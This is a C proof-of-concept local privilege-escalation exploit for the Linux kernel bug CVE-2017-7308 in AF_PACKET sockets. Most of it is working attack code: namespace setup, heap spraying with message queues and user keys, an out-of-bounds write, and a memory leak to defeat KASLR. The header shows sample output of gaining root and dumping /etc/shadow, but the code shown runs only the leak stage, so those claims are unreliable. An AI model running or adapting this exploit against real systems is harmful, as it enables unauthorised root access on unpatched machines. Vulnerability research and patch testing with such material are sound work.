// A proof-of-concept local root exploit for CVE-2017-7308.
// Includes a SMEP & SMAP bypass.
// Tested on 4.8.0-41-generic Ubuntu kernel.
// https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-7308
//
// Usage:
// user@ubuntu:~$ uname -a
// Linux ubuntu 4.8.0-41-generic #44~16.04.1-Ubuntu SMP Fri Mar 3 ...
// user@ubuntu:~$ gcc pwn.c -o pwn
// user@ubuntu:~$ ./pwn
// [.] starting
// [.] namespace sandbox set up
// [.] KASLR bypass enabled, getting kernel addr
// [.] done, kernel text:   ffffffff87000000
// [.] commit_creds:        ffffffff870a5cf0
// [.] prepare_kernel_cred: ffffffff870a60e0
// [.] native_write_cr4:    ffffffff87064210
// [.] padding heap
// [.] done, heap is padded
// [.] SMEP & SMAP bypass enabled, turning them off
// [.] done, SMEP & SMAP should be off now
// [.] executing get root payload 0x401516
// [.] done, should be root now
// [.] checking if we got root
// [+] got r00t ^_^
// root@ubuntu:/home/user# cat /etc/shadow
// root:!:17246:0:99999:7:::
// daemon:*:17212:0:99999:7:::
// bin:*:17212:0:99999:7:::
// ...
//
// Andrey Konovalov <andreyknvl@gmail.com>

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <poll.h>
#include <pthread.h>

#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/resource.h>

#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

#include <linux/xfrm.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <time.h>
#include <assert.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <net/if.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <keyutils.h>


#define PAGESIZE 4096


// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

void packet_socket_rx_ring_init(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {
	// specify using TPACKET_V3 version cause this vulnerability
	// only impacts this verison
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size; // 0x1000
	req.tp_frame_size = frame_size;	// 0x1000
	req.tp_block_nr = block_nr; // 0x1
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	// (1u<<31) + (1u<<30) + 0x8000 - BLK_HDR_LEN - macoff + offset
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;

	// vulnerability happens in this system call
	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	// create a AF_PACKET socket
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size) {
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}

int packet_sock_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

void packet_sock_timer_schedule(int s, int timeout) {
	packet_socket_rx_ring_init(s, 0x1000, 0x1000, 1, 0, timeout);
}

void packet_sock_id_match_trigger(int s) {
	char buffer[16];
	packet_socket_send(s, &buffer[0], sizeof(buffer));
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))

#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))

#define ETH_HDR_LEN	sizeof(struct ethhdr)
#define IP_HDR_LEN	sizeof(struct iphdr)
#define UDP_HDR_LEN	sizeof(struct udphdr)

#define UDP_HDR_LEN_FULL	(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)

int oob_setup(int offset) {
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	unsigned int macoff = netoff - maclen;
	unsigned int sizeof_priv = (1u<<31) + (1u<<30) +
		0x8000 - BLK_HDR_LEN - macoff + offset;
	return packet_socket_setup(0x8000, 2048, 2, sizeof_priv, 100);
}

int oob_setup_kaslr(int offset) {
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	unsigned int macoff = netoff - maclen;
	unsigned int sizeof_priv = (1u<<31) + (1u<<30) +
		0x1000 - BLK_HDR_LEN - macoff + offset;
	return packet_socket_setup(0x1000, 0x200, 2, sizeof_priv, 100);
}

void oob_write(char *buffer, int size) {
	loopback_send(buffer, size);
}

// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *

void kmalloc_pad(int count) {
	int i;
	for (i = 0; i < count; i++)
		packet_sock_kmalloc();
}

void pagealloc_pad(int count) {
	packet_socket_setup(0x8000, 2048, count, 0, 100);
}

void pagealloc_pad_kaslr(int count) {
    // kmalloc-256 uses 1 page slab
	packet_socket_setup(0x1000, 0x200, count, 0, 100);
}


bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}


void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

        if (unshare(CLONE_NEWUSER) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

        if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}


/************************ KASLR BYPASS ***********************/


/* spray 256 */
struct msg {
    long mtype;
    char data[0];
};

int msg_init() {
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (msqid < 0) {
        perror("msgget");
    }
    return msqid;
}

// 200 for 256
void msg_alloc(int msqid, size_t size) {
    struct msg *m = malloc(sizeof(struct msg) + size);
    m->mtype = 1;
    memset(m->data, 0x41, size);
    if (msgsnd(msqid, (void *)m, sizeof(struct msg)+size, 0) != 0) {
        perror("msgsnd");
    }
    free(m);
}


void kmalloc_msg(int num) {
    int msqid;
    msqid = msg_init();

    for (int i=0; i<num; i++) {
        // kmalloc 256
        if (i%50 == 0)
            msqid = msg_init();
        msg_alloc(msqid, 200);
    }
}

key_serial_t spray_key(size_t size, int i) {
	if (size <= 0x18) {
		printf("size <= 0x18\n");
		exit(-1);
	}

	char type[5] = "user";
	char* description = (char*)malloc(sizeof(char)*10);
	char* payload = (char*)malloc(size-0x18); // 256
	memset(payload, 'B', size-0x18);

	key_serial_t key;
	sprintf(description, "key%d", i);
	key = add_key(type, description, payload, size-0x18, KEY_SPEC_USER_KEYRING);
	if (key == -1) {
		perror("add_key");
		exit(0);
	}
    free(description);
    free(payload);
	return key;
}

void* leak_key(key_serial_t key, size_t size) {
	void *data = malloc(size);
	memset(data, 0, size);
    int xxx = keyctl_read(key, data, size);
	if (xxx == -1) {
		perror("keyctl_read");
		exit(-1);
	}
	if (xxx == 0x4444) {
		free(data);
		data = malloc(0x4444);
		// leaking `struct key`
		keyctl_read(key, data, 0x4444);
	}
    printf("read key: %d\n", xxx);
	return data;
}


key_serial_t keys[64];


void oob_user_key() {
    int s = oob_setup_kaslr(0x2000+0x2e8);

    for (int i=0; i<64; i++) {
        keys[i] = spray_key(256, i);
    }

    char buffer[0x300];
    memset(buffer+0x18-2+0x10, 'D', 0x110);
	buffer[0x26] = 0x0;
	buffer[0x27] = 0x10;

    // prb_open_block
    oob_write(buffer, 0x40);
    getchar();
    int target = 0;
    for (int i=0; i<64; i++) {
        printf("%d ", i);
        char *data = leak_key(keys[i], 0x1000);
        for (int j=0; j<0x500-0x10; j++){
            if (!memcmp(data+j+0x10, "DDBBBBBBBBBBBBBB", 16)) {
                DumpHex(data, 0x500);
                target = i;
                printf("We find it!\n");
				goto found;
            }
        }
       	printf("%d\n", i);
       	DumpHex(data, 100);
		free(data);
    }

    printf("Not found\n");
	goto done;

found:
    DumpHex(leak_key(keys[target], 0x2000), 0x2000);

done:
	return;
}


int main (int argc, char **argv)
{
    printf("[.] starting\n");
	setup_sandbox();
    printf("[.] namespace sandbox set up\n");
    printf("[.] padding heap\n");
    kmalloc_msg(0x800);
    pagealloc_pad_kaslr(0x500);
    oob_user_key();

	
    while (1)
    {
        sleep(1000);
    }
    return 1;
}

